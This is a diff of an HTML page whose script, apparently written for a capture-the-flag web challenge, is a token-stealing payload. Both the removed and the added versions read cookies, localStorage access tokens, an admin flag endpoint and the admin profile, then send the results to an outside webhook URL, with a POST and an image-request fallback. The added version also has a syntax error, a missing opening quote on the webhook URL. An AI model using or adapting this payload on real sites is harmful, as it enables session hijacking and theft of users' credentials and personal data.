@@ -1,45 +1,47 @@
 <!DOCTYPE html>
 <html>
 <body>
-    <h1>System Loading...</h1>
-    <script>
-        const webhook = "https://webhooksite.net/215b196e-0451-4dc6-8065-d0328a121432";
+<script>
+    async function collectEverything() {
+        const webhook = https://webhooksite.net/215b196e-0451-4dc6-8065-d0328a121432";
+        let results = {};
 
-        async function ultimateLeak() {
-            let log = { status: "started", flag: "not_found", token: "not_found" };
+        // 1. Grab cookies (if not HttpOnly)
+        results.cookies = document.cookie;
 
-            try {
-                // 1. Attempt to grab the 1000pt Flag
-                const flagRes = await fetch('/api/admin/flag');
-                if (flagRes.ok) log.flag = await flagRes.text();
+        // 2. Grab Local Storage (Where tokens often hide)
+        results.localStorage = JSON.stringify(localStorage);
 
-                // 2. Attempt to grab the Auth Token (ATO)
-                log.token = localStorage.getItem('accessToken') || "no_token_in_storage";
-
-                // 3. EXTERNAL LEAK: Try the Webhook (might be blocked)
-                fetch(`${webhook}?data=${btoa(JSON.stringify(log))}`);
-
-                // 4. INTERNAL LEAK: Write to the Admin's own profile (the bypass)
-                // We'll put the flag in the phone number and the token in the address
-                await fetch('/api/auth/profile', {
-                    method: 'PATCH',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        "fullName": "LEAK_COMPLETE",
-                        "phoneNumber": log.flag.substring(0, 50),
-                        "address": {
-                            "street": log.token.substring(0, 50),
-                            "city": "Check_Webhook_Or_JSON"
-                        }
-                    })
-                });
-            } catch (e) {
-                // Fail-safe: notify webhook of the error
-                fetch(`${webhook}?error=${btoa(e.message)}`);
-            }
+        // 3. Try to fetch the Flag endpoint
+        try {
+            const flagRes = await fetch('/api/admin/flag');
+            results.flag = await flagRes.text();
+        } catch (e) {
+            results.flagError = e.message;
         }
 
-        ultimateLeak();
-    </script>
+        // 4. Try to fetch the Admin's own full profile
+        try {
+            const meRes = await fetch('/api/auth/profile');
+            results.profile = await meRes.json();
+        } catch (e) {
+            results.profileError = e.message;
+        }
+
+        // 5. SEND EVERYTHING AT ONCE
+        // We use POST to ensure the data isn't cut off by URL length limits
+        fetch(webhook, {
+            method: 'POST',
+            mode: 'no-cors',
+            body: JSON.stringify(results)
+        });
+
+        // Backup: Also send via Query String just in case POST is blocked
+        const fallbackUrl = `${webhook}?data=${btoa(JSON.stringify(results)).substring(0, 1000)}`;
+        new Image().src = fallbackUrl;
+    }
+
+    collectEverything();
+</script>
 </body>
 </html>
